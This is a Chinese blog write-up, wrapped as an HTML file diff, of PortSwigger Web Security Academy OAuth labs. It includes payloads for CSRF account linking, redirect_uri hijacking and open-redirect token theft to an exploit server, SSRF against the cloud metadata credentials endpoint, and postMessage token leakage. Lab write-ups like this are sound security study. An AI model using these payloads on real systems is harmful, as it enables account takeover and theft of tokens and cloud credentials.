@@ -1,0 +1,350 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>OAuth authentication | wanan</title><meta name="keywords" content="burp"><meta name="author" content="wanan"><meta name="copyright" content="wanan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="通过 OAuth 隐式流程绕过身份验证     强制 OAuth 配置文件链接  首先通过正常的 登录方式登录   可以看到存在绑定社交媒体页面     这里的关键步骤在这里 其中存在的漏洞点就是 认证的链接 单单靠着一步执行的 而其中也没有别的 参数去防止csrf 假如让一个登录的人访问我们的 &#x2F;oauth-linking?code&#x3D;k-iE3ti7b74nj3jUM_3-L">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OAuth authentication">
+<meta property="og:url" content="https://www.wanan.red/beea7b5.html">
+<meta property="og:site_name" content="wanan">
+<meta property="og:description" content="通过 OAuth 隐式流程绕过身份验证     强制 OAuth 配置文件链接  首先通过正常的 登录方式登录   可以看到存在绑定社交媒体页面     这里的关键步骤在这里 其中存在的漏洞点就是 认证的链接 单单靠着一步执行的 而其中也没有别的 参数去防止csrf 假如让一个登录的人访问我们的 &#x2F;oauth-linking?code&#x3D;k-iE3ti7b74nj3jUM_3-L">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.pixabay.com/photo/2018/11/17/22/15/trees-3822149_1280.jpg">
+<meta property="article:published_time" content="2023-01-08T11:45:34.556Z">
+<meta property="article:modified_time" content="2023-01-08T11:46:39.443Z">
+<meta property="article:author" content="wanan">
+<meta property="article:tag" content="burp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2018/11/17/22/15/trees-3822149_1280.jpg"><link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092159138.jpeg"><link rel="canonical" href="https://www.wanan.red/beea7b5"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="Lkrie_55AalLqll4AtBs-NEomlv8QQYHGMx1V0cbq88"/><meta name="baidu-site-verification" content="code-h7qMMwh8fd"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0a85e115f35e16b8da9503b0d77633ca";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-FYB0HL88QE"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-FYB0HL88QE');
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'OAuth authentication',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-01-08 19:46:39'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/202203092159138.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">99</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">76</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">83</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.pixabay.com/photo/2018/11/17/22/15/trees-3822149_1280.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wanan</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">OAuth authentication</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-01-08T11:45:34.556Z" title="发表于 2023-01-08 19:45:34">2023-01-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-08T11:46:39.443Z" title="更新于 2023-01-08 19:46:39">2023-01-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/burp/">burp</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/burp/OAuth-authentication/">OAuth authentication</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">747</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="OAuth authentication"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="通过-OAuth-隐式流程绕过身份验证"><a href="#通过-OAuth-隐式流程绕过身份验证" class="headerlink" title="通过 OAuth 隐式流程绕过身份验证"></a>通过 OAuth 隐式流程绕过身份验证</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229150908429.png" alt="image-20221229150908429"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229151155075.png" alt="image-20221229151155075"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229151222305.png" alt="image-20221229151222305"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229151452262.png" alt="image-20221229151452262"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229151441537.png" alt="image-20221229151441537"></p>
+<h1 id="强制-OAuth-配置文件链接"><a href="#强制-OAuth-配置文件链接" class="headerlink" title="强制 OAuth 配置文件链接"></a>强制 OAuth 配置文件链接</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229194923459.png" alt="image-20221229194923459"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229194954595.png" alt="image-20221229194954595"></p>
+<p>首先通过正常的 登录方式登录 </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229201756649.png" alt="image-20221229201756649"></p>
+<p>可以看到存在绑定社交媒体页面</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229201815201.png" alt="image-20221229201815201"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229201829686.png" alt="image-20221229201829686"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229201841516.png" alt="image-20221229201841516"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229195112895.png" alt="image-20221229195112895"></p>
+<p>这里的关键步骤在这里 其中存在的漏洞点就是 认证的链接 单单靠着一步执行的 而其中也没有别的 参数去防止csrf 假如让一个登录的人访问我们的 &#x2F;oauth-linking?code&#x3D;k-iE3ti7b74nj3jUM_3-LUhYVrhBu592wzmSmT0d7Tp 那么通过他的session 就会绑定到我们的社交媒体账号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://0a67007d040dc680c337abec006100e0.web-security-academy.net/oauth-linking?code=duxFgvd9fTrdOEAgTRSaESfEQcXxdYLhQotN6vwuiDr&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229195438992.png" alt="image-20221229195438992"></p>
+<p>注意丢弃这个请求</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229195557316.png" alt="image-20221229195557316"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229195828035.png" alt="image-20221229195828035"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229195844679.png" alt="image-20221229195844679"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229195855930.png" alt="image-20221229195855930"></p>
+<h1 id="通过-redirect-uri-劫持-OAuth-帐户"><a href="#通过-redirect-uri-劫持-OAuth-帐户" class="headerlink" title="通过 redirect_uri 劫持 OAuth 帐户"></a>通过 redirect_uri 劫持 OAuth 帐户</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229195954931.png" alt="image-20221229195954931"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229200708980.png" alt="image-20221229200708980"></p>
+<p>可以看到这里存在 redirect_uri 重定向</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://oauth-0a9b005904abc4e7c2add27502bd00cc.web-security-academy.net/auth?client_id=udxb47mhd9thi45c5z1pa&amp;redirect_uri=https://exploit-0a42002104f9c4c9c203d31b010900c3.exploit-server.net/oauth-callback&amp;response_type=code&amp;scope=openid%20profile%20email&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229200851664.png" alt="image-20221229200851664"></p>
+<p>同样需要丢弃</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229200931434.png" alt="image-20221229200931434"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229201226303.png" alt="image-20221229201226303"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229201510062.png" alt="image-20221229201510062"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229201620661.png" alt="image-20221229201620661"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229201632250.png" alt="image-20221229201632250"></p>
+<h1 id="通过开放重定向窃取-OAuth-访问令牌"><a href="#通过开放重定向窃取-OAuth-访问令牌" class="headerlink" title="通过开放重定向窃取 OAuth 访问令牌"></a>通过开放重定向窃取 OAuth 访问令牌</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229225031156.png" alt="image-20221229225031156"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229225420072.png" alt="image-20221229225420072"></p>
+<p>尝试更改重定向  但是只能本域的请求</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229225544484.png" alt="image-20221229225544484"></p>
+<p>这里发现一个开放重定向 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/auth?client_id=wcgy1zo0vkmt0bzxfyvh0&amp;redirect_uri=https://0a36004703f50908c2814dc100f200bd.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a7b00a9039a091fc2d14cf301a20094.exploit-server.net/exploit&amp;response_type=token&amp;nonce=1381684533&amp;scope=openid%20profile%20email</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229225743399.png" alt="image-20221229225743399"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    if (!document.location.hash) &#123;</span><br><span class="line">        window.location = &#x27;https://oauth-0a480037034209e3c2374bb4026e0006.web-security-academy.net/auth?client_id=wcgy1zo0vkmt0bzxfyvh0&amp;redirect_uri=https://0a36004703f50908c2814dc100f200bd.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a7b00a9039a091fc2d14cf301a20094.exploit-server.net/exploit&amp;response_type=token&amp;nonce=1381684533&amp;scope=openid%20profile%20email&#x27;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        window.location = &#x27;/?&#x27;+document.location.hash.substr(1)</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229230156305.png" alt="image-20221229230156305"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229230237352.png" alt="image-20221229230237352"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229230318541.png" alt="image-20221229230318541"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229230330781.png" alt="image-20221229230330781"></p>
+<h1 id="SSRF-通过-OpenID-动态客户端注册"><a href="#SSRF-通过-OpenID-动态客户端注册" class="headerlink" title="SSRF 通过 OpenID 动态客户端注册"></a>SSRF 通过 OpenID 动态客户端注册</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229230836362.png" alt="image-20221229230836362"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/.well-known/openid-configuration</span><br></pre></td></tr></table></figure>
+
+<p>直接访问 这个地址 </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229231510408.png" alt="image-20221229231510408"></p>
+<p>注册 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /reg HTTP/1.1</span><br><span class="line">Host: oauth-0a7f00d40340a246c0f67ad5020700cf.web-security-academy.net</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 67</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;redirect_uris&quot; : [</span><br><span class="line">        &quot;https://example.com&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229231801204.png" alt="image-20221229231801204"></p>
+<p>其中返回了 一个新的client_id </p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229232026348.png" alt="image-20221229232026348"></p>
+<p>这里的logo页面推测可能使用的是clinet_id 尝试添加一个logouri</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /reg HTTP/1.1</span><br><span class="line">Host: oauth-0a7f00d40340a246c0f67ad5020700cf.web-security-academy.net</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 67</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;redirect_uris&quot; : [</span><br><span class="line">        &quot;https://example.com&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;logo_uri&quot; : &quot;https://h5n0wfjfqk66i3yq7watum0ah1nsbnzc.oastify.com&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229232132058.png" alt="image-20221229232132058"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229232149802.png" alt="image-20221229232149802"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229232154336.png" alt="image-20221229232154336"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /reg HTTP/1.1</span><br><span class="line">Host: oauth-0a7f00d40340a246c0f67ad5020700cf.web-security-academy.net</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 141</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;redirect_uris&quot; : [</span><br><span class="line">        &quot;https://example.com&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;logo_uri&quot; : &quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229232237937.png" alt="image-20221229232237937"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229232248657.png" alt="image-20221229232248657"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229232309499.png" alt="image-20221229232309499"></p>
+<h1 id="通过代理页面窃取-OAuth-访问令牌"><a href="#通过代理页面窃取-OAuth-访问令牌" class="headerlink" title="通过代理页面窃取 OAuth 访问令牌"></a>通过代理页面窃取 OAuth 访问令牌</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229232353029.png" alt="image-20221229232353029"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229233444781.png" alt="image-20221229233444781"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229233502378.png" alt="image-20221229233502378"></p>
+<p>这里存在一个iframe</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229233539413.png" alt="image-20221229233539413"></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    parent.<span class="title function_">postMessage</span>(&#123;<span class="attr">type</span>: <span class="string">&#x27;onload&#x27;</span>, <span class="attr">data</span>: <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>&#125;, <span class="string">&#x27;*&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">submitForm</span>(<span class="params">form, ev</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        ev.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;comment-form&quot;</span>));</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> hashParams = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>));</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> o = &#123;&#125;;</span></span><br><span class="line"><span class="language-javascript">        formData.<span class="title function_">forEach</span>(<span class="function">(<span class="params">v, k</span>) =&gt;</span> o[k] = v);</span></span><br><span class="line"><span class="language-javascript">        hashParams.<span class="title function_">forEach</span>(<span class="function">(<span class="params">v, k</span>) =&gt;</span> o[k] = v);</span></span><br><span class="line"><span class="language-javascript">        parent.<span class="title function_">postMessage</span>(&#123;<span class="attr">type</span>: <span class="string">&#x27;oncomment&#x27;</span>, <span class="attr">content</span>: o&#125;, <span class="string">&#x27;*&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        form.<span class="title function_">reset</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看下这段代码 主要用处是向父级窗口发送当前的url</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;iframe src=&quot;https://oauth-0a930046033223f9c1af5bb902e60026.web-security-academy.net/auth?client_id=cktbsx655uw8sgmyd13v8&amp;redirect_uri=https://0a77009103fc23e4c1a05d9e005f008c.web-security-academy.net/oauth-callback/../post/comment/comment-form&amp;response_type=token&amp;nonce=-1552239120&amp;scope=openid%20profile%20email&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.addEventListener(&#x27;message&#x27;, function(e) &#123;</span><br><span class="line">        fetch(&quot;/&quot; + encodeURIComponent(e.data.data))</span><br><span class="line">    &#125;, false)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229234252644.png" alt="image-20221229234252644"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/https://0a77009103fc23e4c1a05d9e005f008c.web-security-academy.net/post/comment/comment-form#access_token=hH1IDsHhNbW_lKdgwRhxoG7DAyKhhF5stMyn25VLY5h&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid profile email</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229234549178.png" alt="image-20221229234549178"></p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20221229234621727.png" alt="image-20221229234621727"></p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/burp/">burp</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.pixabay.com/photo/2018/11/17/22/15/trees-3822149_1280.jpg" data-sites="qq,wechat,weibo,facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-22-45.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" target="_blank"><img class="post-qr-code-img" src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/Snipaste_2022-08-28_20-32-45.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/1bb08f7a.html"><img class="prev-cover" src="https://cdn.pixabay.com/photo/2016/12/14/04/08/thunderbolt-1905603_1280.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">JWT</div></div></a></div><div class="next-post pull-right"><a href="/3e852ff6.html"><img class="next-cover" src="https://cdn.pixabay.com/photo/2016/04/20/19/47/wolves-1341881_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">OS command injection</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/424af0ec.html" title="Access control vulnerabilities"><img class="cover" src="https://cdn.pixabay.com/photo/2018/06/09/17/25/trees-3464777_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-08</div><div class="title">Access control vulnerabilities</div></div></a></div><div><a href="/6da97099.html" title="Business logic vulnerabilities"><img class="cover" src="https://cdn.pixabay.com/photo/2016/10/22/17/46/mountains-1761292_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-08</div><div class="title">Business logic vulnerabilities</div></div></a></div><div><a href="/120e7910.html" title="Clickjacking"><img class="cover" src="https://cdn.pixabay.com/photo/2017/07/19/01/41/clouds-2517653_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-08</div><div class="title">Clickjacking</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" 